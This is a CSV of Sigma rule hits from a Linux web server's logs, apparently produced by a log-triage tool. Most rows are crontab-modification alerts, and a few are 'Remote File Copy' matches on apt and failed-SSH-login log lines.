rule,severity,level,table,count,first_utc,last_utc,timestamp_utc,mitre,matched_row,description,rule_id,rule_file
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:19,T1053.003,timestamp_utc=2021-12-07 10:06:19; timestamp=Dec  7 10:06:19; host=ApacheWebServer; process=crontab; pid=18241; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=489,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:19,T1053.003,timestamp_utc=2021-12-07 10:06:19; timestamp=Dec  7 10:06:19; host=ApacheWebServer; process=crontab; pid=18244; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=491,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:19,T1053.003,timestamp_utc=2021-12-07 10:06:19; timestamp=Dec  7 10:06:19; host=ApacheWebServer; process=crontab; pid=18247; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=493,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:19,T1053.003,timestamp_utc=2021-12-07 10:06:19; timestamp=Dec  7 10:06:19; host=ApacheWebServer; process=crontab; pid=18250; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=495,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:20,T1053.003,timestamp_utc=2021-12-07 10:06:20; timestamp=Dec  7 10:06:20; host=ApacheWebServer; process=crontab; pid=18253; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=497,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:20,T1053.003,timestamp_utc=2021-12-07 10:06:20; timestamp=Dec  7 10:06:20; host=ApacheWebServer; process=crontab; pid=18256; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=499,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:20,T1053.003,timestamp_utc=2021-12-07 10:06:20; timestamp=Dec  7 10:06:20; host=ApacheWebServer; process=crontab; pid=18259; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=501,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:20,T1053.003,timestamp_utc=2021-12-07 10:06:20; timestamp=Dec  7 10:06:20; host=ApacheWebServer; process=crontab; pid=18263; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=503,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:21,T1053.003,timestamp_utc=2021-12-07 10:06:21; timestamp=Dec  7 10:06:21; host=ApacheWebServer; process=crontab; pid=18266; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=505,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:21,T1053.003,timestamp_utc=2021-12-07 10:06:21; timestamp=Dec  7 10:06:21; host=ApacheWebServer; process=crontab; pid=18272; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=507,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:21,T1053.003,timestamp_utc=2021-12-07 10:06:21; timestamp=Dec  7 10:06:21; host=ApacheWebServer; process=crontab; pid=18275; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=509,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:21,T1053.003,timestamp_utc=2021-12-07 10:06:21; timestamp=Dec  7 10:06:21; host=ApacheWebServer; process=crontab; pid=18279; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=511,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:22,T1053.003,timestamp_utc=2021-12-07 10:06:22; timestamp=Dec  7 10:06:22; host=ApacheWebServer; process=crontab; pid=18282; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=513,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:22,T1053.003,timestamp_utc=2021-12-07 10:06:22; timestamp=Dec  7 10:06:22; host=ApacheWebServer; process=crontab; pid=18285; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=515,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:22,T1053.003,timestamp_utc=2021-12-07 10:06:22; timestamp=Dec  7 10:06:22; host=ApacheWebServer; process=crontab; pid=18288; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=517,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:22,T1053.003,timestamp_utc=2021-12-07 10:06:22; timestamp=Dec  7 10:06:22; host=ApacheWebServer; process=crontab; pid=18291; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=519,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:22,T1053.003,timestamp_utc=2021-12-07 10:06:22; timestamp=Dec  7 10:06:22; host=ApacheWebServer; process=crontab; pid=18294; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=521,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:22,T1053.003,timestamp_utc=2021-12-07 10:06:22; timestamp=Dec  7 10:06:22; host=ApacheWebServer; process=crontab; pid=18298; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=523,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:23,T1053.003,timestamp_utc=2021-12-07 10:06:23; timestamp=Dec  7 10:06:23; host=ApacheWebServer; process=crontab; pid=18301; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=525,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:23,T1053.003,timestamp_utc=2021-12-07 10:06:23; timestamp=Dec  7 10:06:23; host=ApacheWebServer; process=crontab; pid=18304; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=527,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:23,T1053.003,timestamp_utc=2021-12-07 10:06:23; timestamp=Dec  7 10:06:23; host=ApacheWebServer; process=crontab; pid=18307; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=529,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:23,T1053.003,timestamp_utc=2021-12-07 10:06:23; timestamp=Dec  7 10:06:23; host=ApacheWebServer; process=crontab; pid=18310; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=531,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:23,T1053.003,timestamp_utc=2021-12-07 10:06:23; timestamp=Dec  7 10:06:23; host=ApacheWebServer; process=crontab; pid=18313; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=533,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:24,T1053.003,timestamp_utc=2021-12-07 10:06:24; timestamp=Dec  7 10:06:24; host=ApacheWebServer; process=crontab; pid=18316; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=535,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:24,T1053.003,timestamp_utc=2021-12-07 10:06:24; timestamp=Dec  7 10:06:24; host=ApacheWebServer; process=crontab; pid=18319; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=537,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:24,T1053.003,timestamp_utc=2021-12-07 10:06:24; timestamp=Dec  7 10:06:24; host=ApacheWebServer; process=crontab; pid=18322; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=539,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:24,T1053.003,timestamp_utc=2021-12-07 10:06:24; timestamp=Dec  7 10:06:24; host=ApacheWebServer; process=crontab; pid=18325; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=541,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:25,T1053.003,timestamp_utc=2021-12-07 10:06:25; timestamp=Dec  7 10:06:25; host=ApacheWebServer; process=crontab; pid=18329; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=543,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:25,T1053.003,timestamp_utc=2021-12-07 10:06:25; timestamp=Dec  7 10:06:25; host=ApacheWebServer; process=crontab; pid=18332; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=545,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:25,T1053.003,timestamp_utc=2021-12-07 10:06:25; timestamp=Dec  7 10:06:25; host=ApacheWebServer; process=crontab; pid=18335; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=547,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:25,T1053.003,timestamp_utc=2021-12-07 10:06:25; timestamp=Dec  7 10:06:25; host=ApacheWebServer; process=crontab; pid=18339; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=549,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:25,T1053.003,timestamp_utc=2021-12-07 10:06:25; timestamp=Dec  7 10:06:25; host=ApacheWebServer; process=crontab; pid=18343; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=551,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:26,T1053.003,timestamp_utc=2021-12-07 10:06:26; timestamp=Dec  7 10:06:26; host=ApacheWebServer; process=crontab; pid=18346; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=553,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:26,T1053.003,timestamp_utc=2021-12-07 10:06:26; timestamp=Dec  7 10:06:26; host=ApacheWebServer; process=crontab; pid=18349; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=555,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:26,T1053.003,timestamp_utc=2021-12-07 10:06:26; timestamp=Dec  7 10:06:26; host=ApacheWebServer; process=crontab; pid=18352; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=557,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:26,T1053.003,timestamp_utc=2021-12-07 10:06:26; timestamp=Dec  7 10:06:26; host=ApacheWebServer; process=crontab; pid=18355; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=559,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:27,T1053.003,timestamp_utc=2021-12-07 10:06:27; timestamp=Dec  7 10:06:27; host=ApacheWebServer; process=crontab; pid=18358; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=561,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:27,T1053.003,timestamp_utc=2021-12-07 10:06:27; timestamp=Dec  7 10:06:27; host=ApacheWebServer; process=crontab; pid=18361; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=563,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:27,T1053.003,timestamp_utc=2021-12-07 10:06:27; timestamp=Dec  7 10:06:27; host=ApacheWebServer; process=crontab; pid=18364; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=565,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:27,T1053.003,timestamp_utc=2021-12-07 10:06:27; timestamp=Dec  7 10:06:27; host=ApacheWebServer; process=crontab; pid=18367; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=567,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:27,T1053.003,timestamp_utc=2021-12-07 10:06:27; timestamp=Dec  7 10:06:27; host=ApacheWebServer; process=crontab; pid=18370; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=569,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:27,T1053.003,timestamp_utc=2021-12-07 10:06:27; timestamp=Dec  7 10:06:27; host=ApacheWebServer; process=crontab; pid=18373; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=571,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:28,T1053.003,timestamp_utc=2021-12-07 10:06:28; timestamp=Dec  7 10:06:28; host=ApacheWebServer; process=crontab; pid=18376; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=573,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:28,T1053.003,timestamp_utc=2021-12-07 10:06:28; timestamp=Dec  7 10:06:28; host=ApacheWebServer; process=crontab; pid=18379; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=575,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-07 10:06:28,T1053.003,timestamp_utc=2021-12-07 10:06:28; timestamp=Dec  7 10:06:28; host=ApacheWebServer; process=crontab; pid=18384; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=578,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,,T1053.003,(further matches suppressed),Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,,T1105,"message=Breaks: cli-common (<< 0.9+nmu1), libansicolor-perl (<< 4.06), libarchive-tar...; log=/var/log/apt/eipp.log.xz; line_no=1614",Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:14,T1105,timestamp_utc=2021-11-19 22:44:14; timestamp=Nov 19 22:44:14; host=ApacheWebServer; process=sshd; pid=11817; message=Invalid user amsftp from 10.0.0.4 port 55242; log=/var/log/auth.log.3.gz; line_no=46489,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:15,T1105,timestamp_utc=2021-11-19 22:44:15; timestamp=Nov 19 22:44:15; host=ApacheWebServer; process=sshd; pid=11797; message=Invalid user amsftp from 10.0.0.4 port 55232; log=/var/log/auth.log.3.gz; line_no=46497,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:16,T1105,timestamp_utc=2021-11-19 22:44:16; timestamp=Nov 19 22:44:16; host=ApacheWebServer; process=sshd; pid=11797; message=Disconnected from invalid user amsftp 10.0.0.4 port 55232 [preauth]; log=/var/log/auth.log.3.gz; line_no=46499,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:16,T1105,timestamp_utc=2021-11-19 22:44:16; timestamp=Nov 19 22:44:16; host=ApacheWebServer; process=sshd; pid=11840; message=Invalid user amsftp from 10.0.0.4 port 55262; log=/var/log/auth.log.3.gz; line_no=46505,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:19,T1105,timestamp_utc=2021-11-19 22:44:19; timestamp=Nov 19 22:44:19; host=ApacheWebServer; process=sshd; pid=11817; message=Disconnected from invalid user amsftp 10.0.0.4 port 55242 [preauth]; log=/var/log/auth.log.3.gz; line_no=46511,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:19,T1105,timestamp_utc=2021-11-19 22:44:19; timestamp=Nov 19 22:44:19; host=ApacheWebServer; process=sshd; pid=11818; message=Invalid user amsftp from 10.0.0.4 port 55254; log=/var/log/auth.log.3.gz; line_no=46514,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:21,T1105,timestamp_utc=2021-11-19 22:44:21; timestamp=Nov 19 22:44:21; host=ApacheWebServer; process=sshd; pid=11840; message=Disconnected from invalid user amsftp 10.0.0.4 port 55262 [preauth]; log=/var/log/auth.log.3.gz; line_no=46516,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:21,T1105,timestamp_utc=2021-11-19 22:44:21; timestamp=Nov 19 22:44:21; host=ApacheWebServer; process=sshd; pid=11818; message=Disconnected from invalid user amsftp 10.0.0.4 port 55254 [preauth]; log=/var/log/auth.log.3.gz; line_no=46518,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
